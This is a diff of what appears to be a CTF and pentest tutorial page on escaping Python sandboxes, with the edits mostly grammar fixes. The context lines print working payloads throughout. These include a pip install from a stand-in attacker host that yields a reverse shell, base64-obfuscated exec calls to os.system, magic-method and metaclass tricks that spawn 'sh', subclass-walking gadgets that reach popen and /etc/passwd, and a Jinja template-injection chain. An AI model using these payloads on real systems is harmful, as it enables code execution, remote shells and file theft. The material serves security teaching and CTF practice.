@@ -68,24 +68,24 @@ system('ls')
 Remember that the _**open**_ and _**read**_ functions can be useful to **read files** inside the python sandbox and to **write some code** that you could **execute** to **bypass** the sandbox.
 
 {% hint style="danger" %}
-**Python2 input()** function allows to execute python code before the program crashes.
+**Python2 input()** function allows executing python code before the program crashes.
 {% endhint %}
 
 Python try to **load libraries from the current directory first** (the following command will print where is python loading modules from): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../.gitbook/assets/image (552).png>)
 
-## Bypass pickle sandbox with default installed python packages
+## Bypass pickle sandbox with the default installed python packages
 
 ### Default packages
 
 You can find a **list of pre-installed** packages here: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
 Note that from a pickle you can make the python env **import arbitrary libraries** installed in the system.\
-For example the following pickle, when loaded, is going to import the pip library to use it:
+For example, the following pickle, when loaded, is going to import the pip library to use it:
 
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
-#however, the victimdoesn't even need to have the library installed to execute it
+#however, the victim doesn't even need to have the library installed to execute it
 #the library is going to be loaded automatically
 
 import pickle, os, base64, pip
@@ -96,13 +96,13 @@ class P(object):
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
 
-For more information about how does pickle works check this: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
+For more information about how pickle works check this: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
 ### Pip package
 
 Trick shared by **@isHaacK**
 
-If you have access to `pip` or to `pip.main()` you can install an arbitrary package and obtain a reverse shell calling:
+If you have access to `pip` or `pip.main()` you can install an arbitrary package and obtain a reverse shell calling:
 
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
@@ -114,7 +114,7 @@ You can download the package to create the reverse shell here. Please, note that
 {% file src="../../../.gitbook/assets/Reverse.tar.gz" %}
 
 {% hint style="info" %}
-This package is called `Reverse`.However, it was specially crafted so when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
+This package is called `Reverse`. However, it was specially crafted so that when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
 {% endhint %}
 
 ## Eval-ing python code
@@ -123,7 +123,7 @@ This package is called `Reverse`.However, it was specially crafted so when you e
 Note that exec allows multiline strings and ";", but eval doesn't (check walrus operator)
 {% endhint %}
 
-This is really interesting if some characters are forbidden because you can use the **hex/octal/B64** representation to **bypass** the restriction:
+If certain characters are forbidden you can use the **hex/octal/B64** representation to **bypass** the restriction:
 
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
@@ -149,7 +149,7 @@ exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ## Operators and short tricks
 
 ```python
-# walrus operator allows to generate variable inside a list
+# walrus operator allows generating variable inside a list
 ## everything will be executed in order
 ## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
 [a:=21,a*2]
@@ -159,7 +159,7 @@ exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 
 ## Python execution without calls
 
-If you are inside a python jail that **doesn't allow to make calls**, there are still some ways to **execute arbitrary functions, code** and **commands**.
+If you are inside a python jail that **doesn't allow you to make calls**, there are still some ways to **execute arbitrary functions, code** and **commands**.
 
 ### RCE with [decorators](https://docs.python.org/3/glossary.html#term-decorator)
 
@@ -176,7 +176,7 @@ class X:
 X = input(X)
 X = exec(X)
 
-# So just send your python code when promped and it will be executed
+# So just send your python code when prompted and it will be executed
 
 
 # Another approach without calling input:
@@ -187,14 +187,14 @@ class _:pass
 
 ### RCE creating objects and overloading
 
-If you can **declare a class** and **create and object** of that class you could **write/overwrite different methods** that can be **triggered** **without** **needing to call them directly**.
+If you can **declare a class** and **create an object** of that class you could **write/overwrite different methods** that can be **triggered** **without** **needing to call them directly**.
 
 #### RCE with custom classes
 
 You can modify some **class methods** (_by overwriting existing class methods or creating a new class_) to make them **execute arbitrary code** when **triggered** without calling them directly.
 
 ```python
-# This class has 3 different was to trigger RCE without directly calling any function
+# This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
     def __init__(self):
         self += "print('Hello from __init__ + __iadd__')"
@@ -245,11 +245,11 @@ __ixor__ (k ^= 'import os; os.system("sh")')
 
 #### Crating objects with [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
-The key thing that metaclasses allow us to do is **make an instance of a class, without calling the constructor** directly, by creating a new class with the target class as metaclass.
+The key thing that metaclasses allow us to do is **make an instance of a class, without calling the constructor** directly, by creating a new class with the target class as a metaclass.
 
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
-# This will define the members on the "sub"class
+# This will define the members of the "subclass"
 class Metaclass(type):
     __getitem__ = exec # So Sub[string] will execute exec(string)
 # Note: Metaclass.__class__ == type
@@ -264,7 +264,7 @@ Sub['import os; os.system("sh")']
 
 #### Creating objects with exceptions
 
-When an **exception is triggered** an object of the **Exception** is **created** without you needing to call the constructor directly (trick from [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
+When an **exception is triggered** an object of the **Exception** is **created** without you needing to call the constructor directly (a trick from [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
 
 ```python
 class RCE(Exception):
@@ -274,7 +274,7 @@ class RCE(Exception):
 raise RCE #Generate RCE object
 
 
-# RCE with __add__ overloading and try/except + raise generacted object
+# RCE with __add__ overloading and try/except + raise generated object
 class Klecko(Exception):
   __add__ = exec
 
@@ -301,7 +301,7 @@ sys.excepthook = X
 # From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
 # The interpreter will try to import an apt-specific module to potentially 
 # report an error in ubuntu-provided modules.
-# Therefore the __import__ functions is overwritten with our RCE
+# Therefore the __import__ functions are overwritten with our RCE
 class X():
   def __init__(self, a, b, c, d, e):
     self += "print(open('flag').read())"
@@ -336,7 +336,7 @@ Get Access Today:
 * [**Builtins functions of python2**](https://docs.python.org/2/library/functions.html)
 * [**Builtins functions of python3**](https://docs.python.org/3/library/functions.html)
 
-If you can access to the **`__builtins__`** object you can import libraries (notice that you could also use here other string representation showed in last section):
+If you can access the **`__builtins__`** object you can import libraries (notice that you could also use here other string representation shown in the last section):
 
 ```python
 __builtins__.__import__("os").system("ls")
@@ -346,7 +346,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ### No Builtins
 
 When you don't have `__builtins__` you are not going to be able to import anything nor even read or write files as **all the global functions** (like `open`, `import`, `print`...) **aren't loaded**.\
-However, **by default python import a lot of modules in memory**. This modules may seem benign, but some of them are **also importing dangerous** functionalities inside of them that can be accessed to gain even **arbitrary code execution**.
+However, **by default python imports a lot of modules in memory**. These modules may seem benign, but some of them are **also importing dangerous** functionalities inside of them that can be accessed to gain even **arbitrary code execution**.
 
 In the following examples you can observe how to **abuse** some of this "**benign**" modules loaded to **access** **dangerous** **functionalities** inside of them.
 
@@ -386,7 +386,7 @@ len.__self__
 # Obtain the builtins from a defined function
 get_flag.__globals__['__builtins__']
 
-# Get builtins from loaded clases
+# Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
 
@@ -395,7 +395,7 @@ get_flag.__globals__['__builtins__']
 #### Python2 and Python3
 
 ```python
-# Recover __builtins__ and make eveything easier
+# Recover __builtins__ and make everything easier
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
@@ -406,7 +406,7 @@ __builtins__["__import__"]('os').system('ls')
 # Possible payloads once you have found the builtins
 .open("/etc/passwd").read()
 .__import__("os").system("ls")
-# There are a lot other payloads that can be abused to execute commands
+# There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
 
@@ -446,7 +446,7 @@ Here I want to explain how to easily discover **more dangerous functionalities l
 
 #### Accessing subclasses with bypasses
 
-One of the most sensitive parts of this technique is to be able to **access the base subclasses**. In the previous examples this was done using `''.__class__.__base__.__subclasses__()` but there are **other possible ways**:
+One of the most sensitive parts of this technique is being able to **access the base subclasses**. In the previous examples this was done using `''.__class__.__base__.__subclasses__()` but there are **other possible ways**:
 
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
@@ -467,8 +467,8 @@ defined_func.__class__.__base__.__subclasses__()
 "".__getattribute__("__class__").mro()[1].__subclasses__()
 "".__getattribute__("__class__").__base__.__subclasses__()
 
-#If attr is present you can access everything as string
-# This is common in Djanjo (and Jinja) environments
+#If attr is present you can access everything as a string
+# This is common in Django (and Jinja) environments
 (''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
 (''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
 ```
@@ -584,7 +584,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Recursive Search of Builtins, Globals...
 
 {% hint style="warning" %}
-This is just **awesome**. If you are **looking for an object like globals, builtins, open or anything** just use this script to **recursively find places were you can find that object.**
+This is just **awesome**. If you are **looking for an object like globals, builtins, open or anything** just use this script to **recursively find places where you can find that object.**
 {% endhint %}
 
 ```python
@@ -624,14 +624,14 @@ SEARCH_FOR = {
     "execute": set()
 }
 
-#More than 4 is veeery time consuming
+#More than 4 is very time consuming
 MAX_CONT = 4
 
-#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be find
+#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
 #ALREADY_CHECKED = set()
 
 def check_recursive(element, cont, name, orig_n, orig_i, execute):
-    # If bigger than maxium, stop
+    # If bigger than maximum, stop
     if cont > MAX_CONT:
         return
     
@@ -653,7 +653,7 @@ def check_recursive(element, cont, name, orig_n, orig_i, execute):
         try:
             check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)
             
-            # WARNING: Calling random functions sometimes kill the script
+            # WARNING: Calling random functions sometimes kills the script
             # Comment this part if you notice that behaviour!!
             if execute:
                 try:
@@ -665,7 +665,7 @@ def check_recursive(element, cont, name, orig_n, orig_i, execute):
         except:
             pass
     
-    # If in a dict, scan also each keys, very important
+    # If in a dict, scan also each key, very important
     if type(element) is dict:
         for new_element in element:
             check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)
@@ -703,7 +703,7 @@ if __name__ == "__main__":
     main()
 ```
 
-You can check the output of this script in this page:
+You can check the output of this script on this page:
 
 {% content-ref url="output-searching-python-internals.md" %}
 [output-searching-python-internals.md](output-searching-python-internals.md)
@@ -790,10 +790,10 @@ class HAL9000(object):
 ## Dissecting Python Objects
 
 {% hint style="info" %}
-If you want to **learn** about **python bytecode** in depth read these **awesome** post about the topic: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+If you want to **learn** about **python bytecode** in depth read this **awesome** post about the topic: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-In some CTFs you could be provided the name of a **custom function where the flag** resides and you need to see the **internals** of the **function** to extract it.
+In some CTFs you could be provided with the name of a **custom function where the flag** resides and you need to see the **internals** of the **function** to extract it.
 
 This is the function to inspect:
 
@@ -845,7 +845,7 @@ get_flag.__code__
 compile("print(5)", "", "single")
 <code object <module> at 0x7f9ca01330c0, file "", line 1>
 
-#Get the attibutes of the code object
+#Get the attributes of the code object
 dir(get_flag.__code__)
 ['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
 ```
@@ -919,7 +919,7 @@ dis.dis(get_flag)
              30 COMPARE_OP               2 (==)
              33 POP_JUMP_IF_FALSE       40
 
-  6          36 LOAD_CONST               5 ('THIS-IS-THE-FALG!')
+  6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
              39 RETURN_VALUE        
 
   8     >>   40 LOAD_CONST               6 ('Nope')
@@ -954,7 +954,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 
 ## Compiling Python
 
-Now, lets imagine that somehow you can **dump the information about a function that you cannot execute** but you **need** to **execute** it.\
+Now, let us imagine that somehow you can **dump the information about a function that you cannot execute** but you **need** to **execute** it.\
 Like in the following example, you **can access the code object** of that function, but just reading the disassemble you **don't know how to calculate the flag** (_imagine a more complex `calc_flag` function_)
 
 ```python
@@ -1006,7 +1006,7 @@ types.CodeType.__doc__
 ### Recreating a leaked function
 
 {% hint style="warning" %}
-In the following example we are going to take all the data needed to recreate the function from the function code object directly. In a **real example**, all the **values** to execute the function **`code_type`** is what **you will need to leak**.
+In the following example, we are going to take all the data needed to recreate the function from the function code object directly. In a **real example**, all the **values** to execute the function **`code_type`** is what **you will need to leak**.
 {% endhint %}
 
 ```python
@@ -1022,7 +1022,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 
 ### Bypass Defenses
 
-In previous examples at the begging of this post you can see **how to execute any python code using the `compile` function**. This is really interesting because you can **execute whole scripts** with loops and everything in a **one liner** (and we could do the same using **`exec`**).\
+In previous examples at the begging of this post, you can see **how to execute any python code using the `compile` function**. This is interesting because you can **execute whole scripts** with loops and everything in a **one liner** (and we could do the same using **`exec`**).\
 Anyway, sometimes it could be useful to **create** a **compiled object** in a local machine and execute it in the **CTF machine** (for example because we don't have the `compiled` function in the CTF).
 
 For example, let's compile and execute manually a function that reads _./poc.py_:
@@ -1054,7 +1054,7 @@ codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module
 function_type(codeobj, mydict, None, None, None)()
 ```
 
-If you cannot access `eval` or `exec` you could create a **proper function**, but calling it directly is usually going to fail with: _constructor not accessible in restricted mode_. So you need a **function not in the restricted environment call this function.**
+If you cannot access `eval` or `exec` you could create a **proper function**, but calling it directly is usually going to fail with: _constructor not accessible in restricted mode_. So you need a **function not in the restricted environment to call this function.**
 
 ```python
 #Compile a regular print
